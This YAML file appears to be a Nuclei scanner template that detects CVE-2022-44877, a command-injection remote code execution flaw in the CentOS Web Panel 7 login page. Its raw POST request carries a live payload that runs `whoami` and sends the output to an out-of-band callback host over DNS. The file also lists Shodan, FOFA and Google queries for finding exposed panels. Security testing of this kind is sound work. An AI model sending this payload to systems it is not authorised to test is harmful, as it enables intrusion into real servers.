http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - Login Redirect.
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - 'POST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}})
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=root&password=toor&commit=Login

    '
id: CVE-2022-44877
info:
  author: For3stCo1d
  classification:
    cpe: cpe:2.3:a:control-webpanel:webpanel:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-44877
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99982
    epss-score: 0.94434
  description: 'CentOS Web Panel 7 before 0.9.8.1147 is susceptible to remote code
    execution via entering shell characters in the /login/index.php component. This
    can allow an attacker to execute arbitrary system commands via crafted HTTP requests
    and potentially execute malware, obtain sensitive information, modify data, and/or
    gain full control over a compromised system without entering necessary credentials.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    fofa-query: title="login | control webpanel"
    google-query: intitle:"login | control webpanel"
    max-request: 1
    product: webpanel
    shodan-query:
    - http.title:"Login | Control WebPanel"
    - http.title:"login | control webpanel"
    vendor: control-webpanel
    verified: true
  name: CentOS Web Panel 7 <0.9.8.1147 - Remote Code Execution
  reference:
  - https://twitter.com/_0xf4n9x_/status/1612068225046675457
  - https://github.com/numanturle/CVE-2022-44877
  - https://gist.github.com/numanturle/c1e82c47f4cba24cff214e904c227386
  - https://nvd.nist.gov/vuln/detail/CVE-2022-44877
  - http://packetstormsecurity.com/files/171725/Control-Web-Panel-7-CWP7-0.9.8.1147-Remote-Code-Execution.html
  remediation: 'Upgrade to CentOS Web Panel version 0.9.8.1147 or later to mitigate
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2022,packetstorm,centos,rce,kev,control-webpanel,vkev,vuln
